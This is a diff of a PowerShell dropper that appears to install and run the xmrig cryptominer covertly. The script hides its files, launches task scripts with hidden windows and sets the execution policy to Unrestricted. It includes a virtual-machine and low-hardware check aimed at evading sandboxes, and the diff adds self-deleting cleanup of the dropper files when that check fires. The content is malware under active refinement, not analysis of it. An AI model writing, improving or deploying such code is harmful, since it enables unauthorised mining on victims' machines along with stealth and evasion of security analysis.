@@ -18,7 +18,12 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # if ((Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V" -or 
 #     (Get-WmiObject Win32_Processor).NumberOfCores -lt 2 -or 
 #     (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB -lt 4) {
-#     exit
+#     
+        Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
+        Remove-Item -Path "$initial_dir\IVbaANzwiphH.cmd"
+        Remove-Item -Path "$initial_dir\initial.cmd"
+        Remove-Item -Path "$initial_dir\nEQlCzTBpDrO.bat"
+        exit
 # }
 
 Set-Variable -Name wd -Value (random_text)
@@ -135,13 +140,14 @@ Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwj
 
 Set-ItemProperty -Name Attributes -Path "$tasks\AEQKCPrkuifY.ps1" -Value "Hidden"
 
-Start-Process -FilePath "$tasks\AEQKCPrkuifY.ps1" -windowstyle hidden
 
 Remove-Item -Path "$initial_dir\ip.txt"
 Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
 Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
 
 Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
+Start-Process -FilePath "$tasks\AEQKCPrkuifY.ps1" -windowstyle hidden
+
 cd "$initial_dir\xmrig-6.22.2"
 # Remove-Item -Path "initial_dir\xmrig-6.22.2\config.json"
 
